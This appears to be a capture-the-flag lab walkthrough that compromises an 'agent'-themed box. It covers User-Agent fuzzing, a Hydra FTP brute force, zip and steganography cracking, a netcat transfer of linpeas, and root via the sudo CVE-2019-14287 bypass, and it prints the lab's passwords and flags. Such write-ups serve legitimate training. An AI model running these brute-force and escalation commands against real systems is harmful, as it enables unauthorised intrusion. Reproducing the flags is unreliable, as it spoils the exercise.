### Enumerate

```
export IP=10.10.0.132
```

Nmap scan:

```
nmap -sC -sV -A -T4 -v -p- -oN scans/nmap.initial 10.10.0.132
```

|command|result|
|---|---|
|sudo|run as root|
|sC|run default scripts|
|sV|enumerate versions|
|A|aggressive mode|
|T4|run a bit faster|
|-p-|scan all ports|
|v|verbose scan (print results while scanning)|
|oN|output to file with nmap formatting|
|scans/*|direct output to my subfolder|

#### How many ports are open?

**Open ports are ==3==**:

|port|service|
|---|---|
|21|FTP|
|22|SSH|
|80|HTTP|

#### How can you redirect yourself to the hidden page?

![[Pasted image 20231114215602.png]]

**We can access the hidden page by changing our ==User-Agent==**

#### What is the agents name?

Run Burp Suite, capture the request and change the user-agent to “R” and got following response:

![[Pasted image 20231114215752.png]]

So we have 25 Agents? Seems like that could (almost) be one for each letter in the alphabet. Testing all combinations in the repeater would be an option, however, I’d rather use an automated tool for this. Therefore we send the request to Intruder (Ctrl + I). There, we set our target (was already set for me), and specify what position we want to change, by enclosing the section in ‘§§’:

![[Pasted image 20231114220147.png]]

We then head to the payload tab, and specify a wordlist – which in our case is just a list of each letter. Then we hit Start Attack:

![[Pasted image 20231114220221.png]]

When hitting attack, Burp sends requests to the server, where the section enclosed in ‘§§’ is changed, using the dictionary.  
On every request but one, we get Status 200, but on User-Agent: C we get Status 302 (Redirect):

![[Pasted image 20231114215845.png]]

Request:
```
GET / HTTP/1.1
Host: 10.10.105.83
User-Agent: C
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
DNT: 1


```

Response:
```
HTTP/1.1 302 Found
Date: Thu, 02 Nov 2023 21:25:00 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: agent_C_attention.php
Content-Length: 218
Connection: close
Content-Type: text/html; charset=UTF-8


<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>

```

As we can see, the response redirects us to $IP/agent_C_attention.php. From there, we see the following message:

![[Pasted image 20231114220446.png]]


```
agent_C_attention.php
```

**The agents name is ==chris==!**

### Hash cracking and brute-force
#### FTP Password

Using Hydra:

```
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://$IP
```

| command | result |
| ------- | ------ |
| **-l:**     | Specify argument for username (here “chris”)    |                                         
|**-P:**         |Specify path to wordlist for brute-force attack  |                                                                                            | |
|**ftp://$IP:**         | Specify protocol and IP         |

Output:

```
[21][ftp] host: 10.10.0.132   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
```

**FTP password is ==crystal==**

#### Zip file password

Files found on the ftp server:

To_agentJ.txt:
```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

cute-alien.jpg
cutie.png

Running `strings` on cutie.png:

```
strings cutie.png
IHDR
PLTE
.(CA
b+FB
8">;&@B&A>9RO =:#<A
;8$@=
.)%>A
:&AA
74-HC
Z5NK
!:@t
"6SB
?/KB
C2OB
CZWn
,Rhc
T9X@>VRMc^
`H_[z
^rmGk>t
<Nq;
Q|?Be>>^>
\!EC
\Y|M
QsK}
vEeHm
PWw5
PLlJ
)[oa
W3D?y
aPAA=
.%sPHz6/|
nVE?e82
*tRNS
IDATx
HI-(./1
        OQv:
b-J$0)
_&*G
s-H$&
        GR6
N#aH.
0v;mu
-M&auuu
<:Dhs
-E8{
=Nx6
/]l2
VZ,B
!/=Oh
0~{+w
Gs$D0
rs*KK"T
V_}$
H=p>D
30Rc
'_yR
lCfYE
oDn^
$oBpc1
A<p:
qJnU
%'Ow
xPg&
ufe=
+Mq2U
Pddd
1C\7
|>&-
i!r)y=
~WJ6
1_;Vh
:xI$
^]]^1
9]#>
Xnuz%z
[@\$-
-?(S
Hqg&
g906
fT*     !
bW[D
|*=\x'
dTWk
9tE!
'=RE|
 '&w!s
 Hv[
S0)g
x1r]
La^n
=XX{
9Dxj
t?Pu
2[Yj
,Pc(d
urx 
cYqiZ<
}p|Ck
+)-7
p*}"
;GL@
\"Rd
iR\_
iRqK
RPDf
|.-.
)?S1
EO>j
0#xhr
kj^m
'H|@
9C&,
%-eU
8%Z0
F@%;
S3Vb
gG!P
FEm'pcy
XC-+
u{0E\
0b!G
p7h'
Zx;d"F
!N+     {A<
:#33w
x6Zg
]zho
7n[F
]s.#
%fFg
AQD!
b+i#
*yc-
j^7k
2oaOi
G@L4?4
04      '
5I?1'
L+d(
{.rx
Yqqv
        E =
] fT
<KVk
9neB
,Rk{p8
}*@'
cmoGU
SlD/
UDn 
sg/|Yv
A>:9
Ur#4e
NOOO
jD      2
0[mV
#ASv
DHIT}
^ZBl
bttM
lE -
Qx:*p
Qt+9b
6}7v
#d0L
+km"
d$ >
dbhe
JCih
!/I&
0y0G
0d"G
o~:rJ(
&3JX
DJ,A2q<
<^}o
rq=E@.
nWLI5rT):\
;{F_<
" ni
h%xi
OsIt
+lX6~
8eVh
5PKf
AL;Y
*s.,
6Y~^
8}\hZ
DXU7
e@8@
95~N
c*#L|g9
?K*Jmy
mT!jc3
Ielm&1Fl
y(BXG
-.k(
eM!\UA
_       +*\#
n<n^$
;zBF
AUh|@G0ZE
jEEM
3yhL
Wn`1b
JoWc
4f:8
K.ZA
\2l|
XJ1'
1K*K
|$|e=
Z"P6
;ogK
'nj#
r,wa.
GLujU
goux<A
$\>Sb
TOjC
mv.-C
.\Z:2"p
Im9f
SP:b,
to\Wl
^j_@K
].*F8
J9s"
k]}[
qj<ZR
VIJ3
fD"5
v<mG
)Nu26
>/gk
<j:_P
";9#H
8~{U
v|zM3
/2w=O
t\iP
b>$'
7~G;g_
nBi
fYi2
^:(r
#B_\S1
83Dl
y"F48
{YNJK
]C3i0
z9#c
+g$5<V
&Im6
YDu+
3E)W
D&vA
)$qf6
wuvv
P;8 
:I~H'
-3NH
4]S&cS
r@r&
l6c)
^>'/H
D)@v6*
rAB4
-?EE
rP"N
fMY*
lF"|1>+
pF<TS
a1_{
 i1.
e,Rn
zF#D
2}FyUp
F#;D}
[:/v
*!F-
hw D
TH'D
]Z      A-
UUTa
j%Dc
2)Ck;
UDaB
yaav
Wqww7
        {       1
G!6R%
0,#8
#Q1u]
tI_O
4e%M
zkY|
C+C4
8;cx's
5DxG
T.WiC
\DB|
h5er
%IDUL
8yLe,
ez      qF
V++S
C=,tu
VS.i2
Db@!
,C["R
13clO
SM/;e4
iw<&D
>buX
nB+p&F
|PA<
LBl+!!F
_fc4
:c<"%e
.C|;
e#D)
{t8F
@)nNE
otzz
WyQFd9X
Kc#D
aBl<
l4$Y
ofQif
H@&!t*~
=-B<
og4|
i8NwQ
M*4>
^0!F
Dtqlv
w<Xv
q`j{%1
J@j%
2-,>$
2;20
lb1"
|tLd<
0#6o
&fGg
 i7w
;COU@
?\>x
M$z6<
`wh+P
7xE 1
$DnB
xA__
wPF|
F-NC
r>_M
]NMt
<+<8
@1UkW
a\El
E)`F
ktr*
eDvQ
q|hhh
B')Y
VcTf
!#\~'
I6!8
y|\{
h383e
J*40
o^;r"
l9C'
:G'{
;U>45G9
$tf"
"KeU$
\j|{
#o}G
a'M(>
w?q|'
x}N.
vnW*w
KgVk
z5>vbP
?fi];
@2      <h
^)QuS
d,"t
.>~B4
Nf>?
t@fD
wYc&F
/v`w!L
 7vf
J,g`
R? |
J\NN
@fb|
:dcF
-J      U
 z"N-"z
C0]D
E1]Ey
$kSh
t\( D
i@W[[
_BK41hq
rjL'
lb;vr
l&c/D
IP79
_S+=
<u%+*?`
-?P{GK
+0"c
0{BQ
84<?4
i#:8
 ]@h^
aM`G
<UVp}
zORs
=3SX~
;.W*
tJ?;
qU~a
Tl>i
"B~7
!=#DY
iwf3"~
-pR('
h:t.
\QBL?
L3}Ov
&=%(
01iI
RK:<
(*[!m
{+|D
o;'G
$^ri~!W"
PMT>\s
f1 o
Q       !OkW
$:\x0
?('C[:
$Kr:T
1"+o
6#LPJ
2KU%
! HD
]<o$
5#XZ
%ZmYy
-!o<
1F@)
J9m|>
q"HM
Hl{:
<8@*4
576#
u$RJ
0533
b,jU
DKI|
:cDT
@jp.
R@%H:
w*j+
@Xp.
Oxm
<c`R
_X(1
AHek
$pSF
-,|va
.A0,"oS I
f'x+
IB`L
55zm\
4V.U
W44fJ"@#
gQ[r
"TN)
t-zq
        %60
*%^(
AfCH
DUp#
WW_nll
\g9R
v:]}
kHu,
7FC:d%lv
]Hu9H
8vz7
7P<O^
.uk 
}mZl
s%_'q
mfOf
#)f]
aqnJ}
&19u
Ein?x
fP"j
i[+*)
1!<31
NB7X
<~;o
6;>!o
XDXT
w*Sp
        ([b!
G9qE
(A}j
^MEjOk
L^ay
"P{J
d: ]
ZT%Q
p7a4u
^[=&
IEND
To_agentR.txt
W\_z#
2a>=
To_agentR.txt
EwwT
```

Seems like it had some txt file hidden in it. Use `binwalk`:

```
binwalk -e cutie.png --run-as=root
```

Zip file was hidden in the image:

| DECIMAL | HEXADECIMAL | DESCRIPTION                                                                                 |
| ------- | ----------- | ------------------------------------------------------------------------------------------- |
| 0       | 0x0         | PNG image, 528 x 528, 8-bit colormap, non-interlaced                                        |
| 869     | 0x365       | Zlib compressed data, best compression                                                      |
| 34562   | 0x8702      | Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt |
| 34820   | 0x8804      | End of Zip archive, footer length: 22                                                       |

This gave us a zip file, 8702.zip, which was password protected. Using `John`:

```
zip2john 8702.zip > john.zip
```

```
john john.zip
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 512/512 AVX512BW 16x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 16 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
alien            (8702.zip/To_agentR.txt)
```

**Password for zip file is ==alien==**

#### Steg password

Extracting the content of the zip file with ==7z==:

```
7z e 8702.zip
```

we get the file To_agentR.txt:

![[Pasted image 20231115190145.png]]

This looks like some encryption – using https://cyberchef.org/:

![[Pasted image 20231115190341.png]]



**The password for Steg is ==Area51==**

#### Who is the other agent (in full name)?

Use steghide on the other image:

```
steghide extract -sf cute-alien.jpg 
```

![[Pasted image 20231115192601.png]]

| stegfile |   result  |
| -------- | --- |
|    extract      |  extracting   |
|   -sf {filename}       | extract data from {filename}    |

```
cat message.txt
```

![[Pasted image 20231115192656.png]]

**The other agent is ==james==**

#### SSH password

**Password is ==hackerrules!==**

### Capture the user flag

#### What is the user flag?

Login to james’ SSH:

```
ssh james@$IP
```

Inside, we find the user flag:

![[Pasted image 20231115193402.png]]

**User flag is ==b03d975e8c92a7c04146cfa7a5a313c7==**

#### What is the incident of the photo called?

Download the image, using ==scp==:

```
scp james@$IP:/home/james/Alien_autospy.jpg  .
```

Doing a ==google image search==, 

**The name of the incident is ==“Roswell Alien Autopsy”==**

### Privilege escalation

#### CVE number for the escalation

Upload ==Linpeas== to the machine, so we can check for possible escalation vectors:

From target machine:

```
nc -lnvp 1234 > linpeas.sh
```

From host machine:

```
nc -w 3 $IP 1234 < /usr/share/peass/linpeas/linpeas.sh
```

From target machine:

```
chmod +x linpeas.sh
```

Linpeas reported back, that a possible PE vector was the Sudo version: ==Sudo version 1.8.21==:

![[Pasted image 20231115203233.png]]

Google an exploit for this version:

![[Pasted image 20231115204318.png]]

Checking our sudo permissions with sudo -l:

![[Pasted image 20231115204553.png]]

Execute bash commands as root:

```
sudo -u#-1 /bin/bash
```

**CVE is: ==CVE-2019-14287==**

#### What is the root flag?

![[Pasted image 20231115205133.png]]

**Root flag is ==b53a02f55b57d4439e3341834d70c062==**

#### (Bonus) Who is Agent R?

**From root.txt, we can read that Agent R is ==DesKel==**
